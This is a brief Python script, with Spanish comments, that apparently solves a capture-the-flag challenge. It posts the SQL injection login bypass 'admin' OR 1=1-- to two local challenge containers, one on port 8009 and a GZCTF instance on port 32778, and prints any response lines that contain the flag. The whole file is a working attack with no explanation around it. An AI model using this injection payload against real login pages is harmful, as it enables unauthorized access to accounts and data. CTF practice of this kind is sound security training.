import requests

# 1. Contenedor local (docker-compose) en puerto 8009
s1 = requests.Session()
r1 = s1.post("http://localhost:8009/login", data={"username": "admin' OR 1=1--", "password": "x"}, allow_redirects=True)
print("=== Puerto 8009 (docker-compose local) ===")
for line in r1.text.splitlines():
    if "CHRONOS" in line or "flag" in line:
        print(line.strip())

# 2. Contenedor dinamico de GZCTF en puerto 32778
s2 = requests.Session()
r2 = s2.post("http://localhost:32778/login", data={"username": "admin' OR 1=1--", "password": "x"}, allow_redirects=True)
print("\n=== Puerto 32778 (Instancia dinamica de GZCTF) ===")
for line in r2.text.splitlines():
    if "CHRONOS" in line or "flag" in line:
        print(line.strip())
